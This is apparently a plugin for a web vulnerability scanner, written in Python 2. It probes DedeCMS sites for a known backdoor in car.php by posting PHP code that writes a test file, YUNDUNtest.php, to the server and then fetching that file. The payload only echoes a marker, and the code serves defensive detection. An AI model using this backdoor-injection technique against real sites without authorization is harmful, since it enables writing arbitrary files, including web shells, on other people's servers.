#!/usr/bin/python
# -*- coding: utf-8 -*-
from engine.engine_utils.common import *
from engine.logger import scanLogger as logger


def run_domain(http,ob):
    result = []
    try:

        frame = ob.get('siteType')
        if frame and frame in ['asp', 'aspx', 'jsp']:
            return []

        scheme = ob['scheme']
        domain = ob['domain']
        result = []

        inj_path_list = [
            "/dede/plus",

            "/plus"
            ]

        header = {
            "Pragma":"no-cache",
            "User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding":"gzip, deflate",
            "Cache-Control":"no-cache",
            "Cookie": ob.get('cookie') if ob.get('cookie') else '',
            "Connection":"keep-alive",
            "Host": domain
        }

        body = """$a=fopen('YUNDUNtest.php','w+');fwrite($a,\"<?php echo "YUNDUN_test";?>\");"""
        source_ip = ob.get('source_ip')
        if source_ip:
            domain = source_ip
        for inj_path in inj_path_list:
            url = "%s://%s%s%s" % (scheme, domain, inj_path, "/car.php")
            url2 = "%s://%s%s%s" % (scheme, domain, inj_path, "/YUNDUNtest.php")
            res1, content1 = http.request(url, 'POST', body=body, headers=header)
            res2, content2 = http.request(url2, 'GET', headers=header)
            if res2 and res2.get('status') == '200' and re.search('YUNDUN_test', content2):
                detail = '检测到织梦CMS\'shopcar.class.php\'后门；请及时删除测试文件YUNDUNtest.php'
                request = getRequest(url2, domain=ob['domain'])
                response = getResponse(res2, content2)
                result.append(getRecord(ob, url2, ob['level'], detail, request, response))

    except Exception, e:
        logger.error("File:DedeCmsShopcar_classBackDoorScript_yd.py, run_domain function :%s" % (str(e)))

    return result

